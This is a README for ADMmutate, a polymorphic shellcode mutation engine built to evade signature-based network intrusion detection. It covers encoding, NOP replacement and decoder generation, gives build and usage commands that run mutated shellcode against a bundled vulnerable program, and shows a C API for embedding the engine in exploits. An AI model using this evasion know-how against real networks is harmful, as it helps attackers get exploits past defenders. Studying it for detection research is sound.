# ADMmutate

```
                     ___      ______      _       _
                   /     \   |   _   \   |  \   /  |
                  |  / \  |  |  |  \  |  |   \_/   |
                  | |___| |  |  |_ /  |  |   \_/   |
..oO  THE          |  ---  |  |       /   |  |   |  |         CreW Oo..
                  '''   '''   '''''''    ''''   ''''
                              presents

                     [ ADMmutate 0.8.4 by K2 ]

            A shellcode mutation engine that can evade NIDS.
```

[](https://www.gnu.org/licenses/agpl-3.0)

## Table of Contents

- [Overview](#overview)
- [Features](#features)
- [How It Works](#how-it-works)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Documentation](#documentation)
- [Architecture Support](#architecture-support)
- [Compatibility](#compatibility)
- [Security](#security)
- [Contributing](#contributing)
- [License](#license)
- [Acknowledgments](#acknowledgments)

## Overview

ADMmutate is a polymorphic shellcode mutation engine designed to evade Network Intrusion Detection Systems (NIDS). It uses techniques pioneered by virus writers to create functionally equivalent but unique code fragments that resist signature-based detection.

### What is Polymorphism?

Polymorphism is the ability to exist in multiple forms. ADMmutate applies mutation algorithms to application-level data, creating equivalently functional but completely unique code fragments on each execution.

## Features

- **Polymorphic Encoding**: XOR-based encoding with 2×16-bit keys for maximum keyspace
- **Sliding Keys**: IA32 sliding keys defeat shellcode recovery attempts (64-bit key+slide combinations)
- **NOP Replacement**: Up to 55 single-byte NOP alternatives on IA32 (about 1/5 of byte address space)
- **Multiple Code Paths**: Out-of-order decoder generation with multiple instruction alternatives
- **Character Filtering**: Support for `toupper()`, `tolower()`, and custom banned character sets
- **Offset Modulation**: Return address randomization for increased variance
- **Multi-Architecture Support**: IA32, SPARC, HPPA, MIPS architectures
- **Weighted Junk Instructions**: Statistical pattern matching with configurable weights
- **High-Resolution Seeding**: CPU tick/counter register seeding for rapid random generation

## How It Works

### The Problem: NIDS Detection

```mermaid
graph LR
    A[Network Traffic] --> B{NIDS Detection}
    B -->|Signature Analysis| C[Pattern Matching]
    B -->|Protocol Analysis| D[Protocol Violations]
    B -->|Traffic Statistics| E[Anomaly Detection]
    C -->|Match Found| F[⚠️ ALERT]
    D -->|Violation| F
    E -->|Anomaly| F
    
    style A fill:#1a1a2e,stroke:#16213e,color:#fff
    style B fill:#e94560,stroke:#c72c48,color:#fff
    style C fill:#e94560,stroke:#c72c48,color:#fff
    style D fill:#e94560,stroke:#c72c48,color:#fff
    style E fill:#e94560,stroke:#c72c48,color:#fff
    style F fill:#ff5722,stroke:#d84315,color:#fff
```



Network Intrusion Detection Systems typically employ several techniques:

- **Signature Analysis**: Pattern matching against known attack signatures
- **Protocol Analysis**: Detecting protocol violations
- **Traffic Pattern Statistics**: Identifying anomalous traffic patterns

ADMmutate specifically targets signature analysis vulnerabilities.

### The Solution: Polymorphic Shellcode

```mermaid
%%{init: {'theme':'dark'}}%%
flowchart TD
    A[Traditional Exploit] --> B[NOP Sled<br/>700 bytes 0x90]
    B --> C[Static Shellcode<br/>80 bytes]
    C --> D[Return Address<br/>200 bytes]
    
    E[ADMmutate Transform] --> F[Polymorphic Junk NOPs<br/>55 different opcodes]
    F --> G[Dynamic Decoder<br/>Multiple code paths]
    G --> H[Encoded Shellcode<br/>XOR with random keys]
    H --> I[Modulated Return<br/>Randomized offset]
    
    A -.->|Detected by<br/>NIDS| J[🚨 Signature Match]
    E -.->|Evades| K[✅ Unique Each Time]
    
    style A fill:#5c2626,stroke:#8b3a3a,color:#fff
    style B fill:#6b2c2c,stroke:#8b3a3a,color:#fff
    style C fill:#6b2c2c,stroke:#8b3a3a,color:#fff
    style D fill:#6b2c2c,stroke:#8b3a3a,color:#fff
    style E fill:#1a472a,stroke:#2d5f3f,color:#fff
    style F fill:#235a35,stroke:#2d7a45,color:#fff
    style G fill:#2d6e40,stroke:#3a8f52,color:#fff
    style H fill:#2d6e40,stroke:#3a8f52,color:#fff
    style I fill:#2d6e40,stroke:#3a8f52,color:#fff
    style J fill:#d32f2f,stroke:#b71c1c,color:#fff
    style K fill:#388e3c,stroke:#2e7d32,color:#fff
```



Traditional buffer overflow exploits follow a pattern:
```
[NOP Sled (700 bytes)] + [Shellcode (80 bytes)] + [Return Address (200 bytes)]
```

ADMmutate transforms this into:
```
[Junk NOPs] + [Decoder] + [Encoded Shellcode] + [Modulated Return]
```

#### Key Techniques


**1. Shellcode Encoding**: XOR encoding with random keys ensures unique signatures

**2. NOP Replacement**: Substitutes 0x90 NOPs with equivalent instructions (preserving length)

**3. Dynamic Decoder Generation**:
   - Multiple code paths for each instruction
   - Non-operational padding instructions
   - Out-of-order instruction generation
   - Randomly generated junk operations

**4. Advanced Obfuscation**:
   - Weighted instruction selection for statistical matching
   - Dynamic instructions (e.g., `ADD N, %EAX`)
   - Spare register utilization for junk operations

## Installation

### Prerequisites

- GCC compiler
- GNU Make
- Supported operating system (see [Compatibility](#compatibility))

### Build Instructions

1. Clone the repository:
```bash
git clone https://github.com/K2/ADMMutate.git
cd ADMMutate
```

2. Configure for your platform (edit `Makefile`):
```makefile
# Uncomment your OS
OS=-DLINUX
# OS=-DHPUX
# OS=-DBSD
# OS=-DOS5
# OS=-DTRU64

# Configure architecture-specific random seed
CFLAGS=-O -DDSRAND -DIA32_RND
# CFLAGS=-O -DDSRAND -DSPARCV9_RND
# CFLAGS=-O -DDSRAND -DHPPA_RND
```

3. Build the project:
```bash
make clean
make
```

This will create:
- `m7` - Mutation filter demo
- `exp` - Basic exploit example
- `expx` - API demonstration exploit
- `qp` - Remote qpop Linux exploit demo
- `vulnerable` - Local vulnerable test program
- `vulnerable-remote` - Remote vulnerable test program

## Quick Start

### Basic Usage with m7

The `m7` tool is a demonstration mutation filter:

```bash
# Generate polymorphic shellcode from stdin
./exp | ./m7 -i -o 0xbffff63e -n 0x90

# Read from binary file
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp

# With toupper() resilience
./m7 -U -i -o 0xbffff67e -n 0x90 -x ./exp

# With tolower() resilience
./m7 -l -i -o 0xbffff67e -n 0x90 -x ./exp

# Output as C array
./m7 -c -i -o 0xbffff67e -n 0x90 -x ./exp

# With offset modulation
./m7 -u -i -o 0xbffff67e -n 0x90 -x ./exp

# With buffer truncation
./m7 -t 100 -i -o 0xbffff67e -n 0x90 -x ./exp
```

### Testing

Test the mutation engine with the vulnerable programs:

```bash
# Local exploitation test
./vulnerable `./exp | ./m7 -i -o 0xbffff63e -n 0x90`

# Direct execution test
./m7 -i -o 0xbffff67e -n 0x90 -x ./exp
```

### API Usage


To integrate ADMmutate into your exploit:

```c
#include "ADMmutapi.h"

int main() {
    char buffer[BUFSIZ];
    struct morphctl mut;
    
    // Initialize mutation control structure
    mut.upper = 0;      // toupper() resilience
    mut.lower = 0;      // tolower() resilience  
    mut.banned = NULL;  // banned characters
    mut.arch = IA32;    // target architecture
    
    // Initialize mutation engine
    init_mutate(&mut);
    
    // Apply encoding to shellcode
    apply_key(buffer, strlen(shellcode), nops-1, &mut);
    
    // Replace NOPs with junk instructions
    apply_jnops(buffer, nops-1, mut);
    
    // Generate and insert decoder
    apply_engine(buffer, strlen(shellcode), nops-1, mut);
    
    // Optional: modulate return address
    apply_offset_mod(buffer, ret_size, ret_offset, mut);
    
    return 0;
}
```

## Documentation

Comprehensive documentation is available in the `docs/` directory:

- **[Getting Started Guide](docs/GETTING_STARTED.md)** - Detailed installation and first steps
- **[Architecture Guide](docs/ARCHITECTURE.md)** - Internal design and algorithms
- **[API Reference](docs/API_REFERENCE.md)** - Complete API documentation
- **[Examples](docs/EXAMPLES.md)** - Real-world usage examples

## Architecture Support

| Architecture | Status | Decoder | NOPs | Notes |
|-------------|--------|---------|------|-------|
| IA32 (x86) | ✅ Full | 13 inst | 55 | Standard and sliding key support |
| IA32_SLIDE | ✅ Full | 14 inst | 55 | Enhanced with sliding keys (64-bit keyspace) |
| SPARC | ✅ Full | 15 inst | 21 | - |
| HPPA | ⚠️ Partial | 15 inst | 11 | Keep JMAX at 2 due to encoding issues |
| MIPS | 🔧 Planned | - | - | Coming soon |

### Architecture-Specific Notes

**IA32**: Full support with approximately 55 suitable 1-byte NOP replacements. Variable-length instructions (1-16 bytes) make detection difficult for NIDS.

**HPPA**: Requires special handling due to separate I and D caches. Uses fork() trick where parent dies and child executes with flushed cache.

**IA32_SLIDE**: Sliding keys increment by random 32-bit value each decoder iteration, achieving effective 64-bit key+slide combinations.

## Compatibility

Tested and working on:
- Linux (various distributions)
- Solaris 2.x
- IRIX 6.x
- HP-UX 11
- OpenBSD 2.x
- FreeBSD 4.3
- NetBSD 1.x
- UnixWare 7.x
- OpenServer 5.x
- TRU64 5.x

## Security

### Responsible Use

**⚠️ IMPORTANT**: This tool is provided for **educational and research purposes only**. 

See [SECURITY.md](SECURITY.md) for:
- Supported versions
- Vulnerability reporting
- Enhancement suggestions

### DISCLAIMER

This product is meant for educational purposes only. Any resemblance to real persons, living or dead is purely coincidental. See full disclaimer in original README.

## Contributing

Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

### Extending Architecture Support

To add a new architecture:

1. Create a decoder skeleton in `zdec.<arch>.S`
2. Add architecture-specific junks array to `ADMmuteng.h`
3. Implement `mutate_fixup()` patch for the architecture
4. Add architecture constant to `ADMmutapi.h`
5. Update documentation

See [docs/ARCHITECTURE.md](docs/ARCHITECTURE.md) for detailed instructions.

## License

ADMmutate is licensed under the [GNU Affero General Public License v3.0](LICENSE).

## Acknowledgments

### Greets
- ADM CREW ❤️
- plaguez, ksoze, dr, lord julus, innu, w00w00, vacuum, jeru
- ActivaTE, Cough, andrewg
- All old virus coders who pioneered these techniques

### Author
K2 - [K2@ktwo.ca](mailto:K2@ktwo.ca)

### Version
ADMmutate 0.8.4

---

*"There is always more than one way to do it"*
